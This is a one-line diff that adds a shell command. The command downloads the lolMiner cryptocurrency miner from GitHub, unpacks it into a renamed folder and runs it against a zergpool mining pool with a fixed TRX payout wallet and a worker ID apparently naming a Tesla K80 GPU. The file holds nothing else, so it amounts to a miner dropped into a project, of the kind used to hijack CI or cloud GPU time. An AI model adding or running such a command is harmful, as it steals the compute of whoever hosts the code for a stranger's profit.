@@ -1,0 +1,1 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.38/lolMiner_v1.38_Lin64.tar.gz && tar -xvf lolMiner_v1.38_Lin64.tar.gz && mv 1.38 mng && cd mng && chmod +x lolMiner && ./lolMiner --algo ETHASH --pool ethash.eu.mine.zergpool.com:9999 --user TCPsqFMZ57FyFQGWsAfzYcfb1yMC2hqjEm --pass c=TRX,mc=TSF,ID=k80-t $(nproc)-n
